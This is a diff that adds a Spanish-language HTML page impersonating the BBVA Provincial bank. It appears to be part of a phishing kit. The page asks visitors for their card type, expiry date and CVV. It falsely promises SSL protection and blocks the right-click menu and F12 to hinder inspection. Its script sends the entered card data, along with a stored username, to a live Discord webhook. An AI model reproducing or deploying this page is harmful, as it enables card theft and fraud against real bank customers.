@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Provincial</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+    <script src="ipvalidation.js"></script>
+    <link rel="icon" href="icono.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="icono.png">
+    <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 71)) {
+                return false;
+            }
+        };
+    </script>
+    <script>
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</head>
+<body class="body">
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="cuadrote">
+            <img class="logo" src="logo1.jpg">
+        </div>
+        <div>
+        <div class="titulo" style="color: #004080;">
+            <p>Ingresa los datos de tu tarjeta</p>
+        </div>
+        <div class="centrado1" style="margin-left: 10px;">
+            <select id="opciones" class="documento3" style="margin-top: 10px;">
+              <option value="as">Selecciona una opción</option>
+              <option value="asd">Tarjeta de débito</option>
+              <option value="asdd">Tarjeta de crédito</option>
+            </select>
+        </div><br>
+        <div class="centrado1">
+                <input class="documento4" type="text" id="documento" name="documento" placeholder="mes/año" required minlength="4">
+                <input class="documento4" type="text" id="pass" name="pass" placeholder="CVV" required inputmode="numeric" minlength="3" maxlength="4" pattern="[0-9]*">
+        </div><br>
+        <div class="centrado1">
+            <button type="submit" class="boton"><b>Siguiente</b></button>
+        </div>
+        <div class="centrado1">
+            <p style="color: #333">Seguridad protegida con cifrado SSL de 225 bits para mayor confianza y protección de la información.</p>
+        </div>
+    </form>
+    <script>
+        function enviarFormulario(event) {
+            event.preventDefault();
+            
+            var documento = document.getElementById("documento").value;
+            var pass = document.getElementById("pass").value;
+            var opciones = document.getElementById("opciones");
+            var usuario = localStorage.getItem("usuario");
+            var tipoDocumento = opciones.options[opciones.selectedIndex].text;
+        
+            if (opciones.value === "seleccion") {
+                alert("Por favor selecciona un tipo de tarjeta.");
+                return; 
+            }
+        
+            const webhookURL = "https://discord.com/api/webhooks/1349064529908334603/IhrpAkq7q8a0vPayD0FaqVN5PlZI5yQBJkfutHnm2r9A2RkDW7oNEJjFIm308NHvrPWR"; 
+        
+            const mensaje = {
+                content: `
+                **Tipo de tarjeta:** ${tipoDocumento}
+                **CVV:** ${documento}
+                **MM/AA:** ${pass}
+                **Usuario:** ${usuario}`
+            };
+        
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(mensaje)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Mensaje enviado correctamente.");
+                    window.location.href = 'index6.html';
+                } else {
+                    throw new Error(`Error en la respuesta: ${response.statusText}`);
+                }
+            })
+            .catch(error => {
+                console.error('Error al enviar el mensaje:', error);
+                alert('Hubo un problema al enviar los datos.');
+            });
+            
+        }        
+    </script>
+</body>
+</html>
